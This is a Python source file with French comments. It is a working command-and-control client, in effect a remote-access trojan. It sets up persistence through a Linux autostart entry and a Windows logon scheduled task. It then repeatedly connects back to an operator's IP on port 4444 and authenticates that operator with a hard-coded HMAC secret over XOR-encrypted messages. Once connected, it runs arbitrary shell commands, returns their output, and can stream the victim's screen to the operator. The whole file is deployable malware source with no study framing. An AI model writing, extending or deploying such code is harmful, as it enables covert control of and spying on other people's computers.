#!/usr/bin/env python3
import argparse
import importlib.util
import json
import os
import platform
import socket
import struct
import subprocess
import sys
import threading
import time
import hashlib
import hmac
import secrets
from datetime import datetime, timezone
from io import BytesIO
from pathlib import Path

# --- CONFIGURATION ---
PORT = 4444
VIDEO_PORT = 5001
APP_NAME = "clienttcp"
SECRET = "PSK-2027-C2"
KEY = hashlib.sha256(b"c2_encryption_key_2027").digest()
HEADER_FORMAT = ">I"
HEADER_SIZE = struct.calcsize(HEADER_FORMAT)
SYSTEME = platform.system()

if SYSTEME == "Windows":
    CONFIG_DIR = Path(os.getenv("APPDATA", str(Path.home()))) / APP_NAME
else:
    CONFIG_DIR = Path.home() / ".config" / APP_NAME

AUTOSTART_DIR = Path.home() / ".config" / "autostart"
AUTOSTART_FILE = AUTOSTART_DIR / "clienttcp.desktop"
IP_FILE = CONFIG_DIR / "server_ip"
TASK_NAME = "ClientTCP"
MAX_FRAME = 8 * 1024 * 1024

video_stop = threading.Event()
video_thread = None
video_lock = threading.Lock()

# --- GESTION DES DÉPENDANCES (Vidéo) ---
def preparer_dependances():
    modules = (("mss", "mss"), ("Pillow", "PIL"))
    manquants = [nom for nom, module in modules if importlib.util.find_spec(module) is None]
    
    if not manquants:
        return

    if SYSTEME == "Linux":
        venv_dir = CONFIG_DIR / "venv"
        python_venv = venv_dir / "bin" / "python"
        if not python_venv.exists():
            CONFIG_DIR.mkdir(parents=True, exist_ok=True)
            creation = subprocess.run([sys.executable, "-m", "venv", str(venv_dir)], capture_output=True, text=True)
            if creation.returncode != 0:
                subprocess.run(["su", "-c", "apt-get update && apt-get install -y python3-venv"], check=True)
                subprocess.run([sys.executable, "-m", "venv", str(venv_dir)], check=True)
        
        subprocess.run([str(python_venv), "-m", "pip", "install", "--disable-pip-version-check", "mss", "Pillow"], check=True)
        os.execv(str(python_venv), [str(python_venv), str(Path(__file__).resolve()), *sys.argv[1:]])
    else:
        # Installation auto sous Windows
        print("[INSTALL] Installation des modules vidéo (mss, Pillow)...")
        subprocess.run([sys.executable, "-m", "pip", "install", "mss", "Pillow"], check=False)

# --- PERSISTANCE ---
def enregistrer_ip(ip):
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    IP_FILE.write_text(ip, encoding="utf-8")

def lire_ip():
    return IP_FILE.read_text(encoding="utf-8").strip() if IP_FILE.exists() else None

def installer_demarrage():
    python = sys.executable
    script = Path(__file__).resolve()

    if SYSTEME == "Linux":
        AUTOSTART_DIR.mkdir(parents=True, exist_ok=True)
        contenu = f"[Desktop Entry]\nType=Application\nName=Client TCP\nExec=\"{python}\" \"{script}\" --client\nTerminal=false\nX-GNOME-Autostart-enabled=true\n"
        AUTOSTART_FILE.write_text(contenu, encoding="utf-8")
    elif SYSTEME == "Windows":
        pythonw = Path(python).with_name("pythonw.exe")
        executable = str(pythonw if pythonw.exists() else Path(python))
        commande = f'"{executable}" "{script}" --client'
        subprocess.run(["schtasks", "/Create", "/TN", TASK_NAME, "/TR", commande, "/SC", "ONLOGON", "/RL", "LIMITED", "/IT", "/F"], check=True)
        subprocess.run(["schtasks", "/Run", "/TN", TASK_NAME], check=True)

# --- CHIFFREMENT C2 ---
def _keystream(length):
    out = b""
    counter = 0
    while len(out) < length:
        out += hashlib.sha256(KEY + counter.to_bytes(8, "big")).digest()
        counter += 1
    return out[:length]

def _crypt(data):
    return bytes(a ^ b for a, b in zip(data, _keystream(len(data))))

def send_message(sock, message):
    data = json.dumps(message).encode("utf-8")
    enc = _crypt(data)
    sock.sendall(struct.pack(HEADER_FORMAT, len(enc)) + enc)

def _recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connexion fermée")
        data += chunk
    return data

def recv_message(sock):
    header = _recv_exact(sock, HEADER_SIZE)
    length = struct.unpack(HEADER_FORMAT, header)[0]
    body = _recv_exact(sock, length)
    return json.loads(_crypt(body).decode("utf-8"))

def _hmac(secret, nonce):
    return hmac.new(secret.encode(), nonce.encode(), hashlib.sha256).hexdigest()

# --- EXÉCUTION DE COMMANDES ---
def execute(command, timeout=30):
    try:
        if SYSTEME == "Windows":
            proc = subprocess.run(["cmd.exe", "/c", command], capture_output=True, text=True, encoding='cp1252', errors='replace', timeout=timeout)
        else:
            proc = subprocess.run(["sh", "-c", command], capture_output=True, text=True, timeout=timeout)
        output = proc.stdout
        if proc.stderr:
            output += proc.stderr
        return output, proc.returncode
    except subprocess.TimeoutExpired:
        return "[ERREUR] Délai dépassé", -1
    except Exception as exc:
        return f"[ERREUR] {exc}", -1

# --- VIDÉO ---
def boucle_capture(ip):
    try:
        import mss
        from PIL import Image
    except ImportError:
        return

    client_id = socket.gethostname()[:128]
    try:
        with socket.create_connection((ip, VIDEO_PORT), timeout=10) as flux:
            flux.settimeout(10)
            flux.sendall((json.dumps({"client_id": client_id}) + "\n").encode("utf-8"))
            with mss.MSS() as captureur:
                moniteur = captureur.monitors[1]
                while not video_stop.is_set():
                    debut = time.monotonic()
                    shot = captureur.grab(moniteur)
                    image = Image.frombytes("RGB", shot.size, shot.rgb)
                    if image.width > 1280:
                        hauteur = max(1, round(image.height * 1280 / image.width))
                        image = image.resize((1280, hauteur))
                    tampon = BytesIO()
                    image.save(tampon, format="JPEG", quality=65, optimize=True)
                    donnees = tampon.getvalue()
                    if len(donnees) <= MAX_FRAME:
                        flux.sendall(struct.pack("!I", len(donnees)) + donnees)
                    attente = 0.04 - (time.monotonic() - debut)
                    if attente > 0:
                        video_stop.wait(attente)
    except Exception:
        pass

def demarrer_video(ip):
    global video_thread
    with video_lock:
        if not (video_thread and video_thread.is_alive()):
            video_stop.clear()
            video_thread = threading.Thread(target=boucle_capture, args=(ip,), daemon=True)
            video_thread.start()
    return "Flux vidéo démarré."

def arreter_video():
    video_stop.set()
    return "Flux vidéo arrêté."

# --- LOGIQUE C2 ---
def c2_mode(sock, ip):
    send_message(sock, {
        "type": "info",
        "payload": {"os": SYSTEME.lower(), "hostname": socket.gethostname()},
    })
    nonce = secrets.token_hex(16)
    send_message(sock, {"type": "challenge", "payload": nonce})
    auth = recv_message(sock)
    
    if not auth or auth.get("type") != "auth" or auth.get("payload") != _hmac(SECRET, nonce):
        return

    while True:
        msg = recv_message(sock)
        mtype = msg.get("type")
        if mtype == "command":
            cmd = msg.get("payload", "").strip()
            if cmd == "video":
                output = demarrer_video(ip)
                send_message(sock, {"type": "result", "payload": output})
            elif cmd == "stopvideo":
                output = arreter_video()
                send_message(sock, {"type": "result", "payload": output})
            elif cmd == "bye":
                break
            else:
                output, code = execute(cmd)
                if code == 0:
                    send_message(sock, {"type": "result", "payload": output})
                else:
                    send_message(sock, {"type": "error", "payload": output or f"code retour {code}"})

def lancer_client(ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((ip, PORT))
            sock.settimeout(None)
            c2_mode(sock, ip)
            sock.close()
        except Exception:
            time.sleep(10)

# --- MAIN ---
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", nargs="?")
    parser.add_argument("--client", action="store_true")
    args = parser.parse_args()

    preparer_dependances()

    if args.client:
        ip = lire_ip()
        if ip:
            lancer_client(ip)
        return

    if not args.ip:
        parser.print_help()
        return

    enregistrer_ip(args.ip)
    installer_demarrage()
    lancer_client(args.ip)

if __name__ == "__main__":
    main()
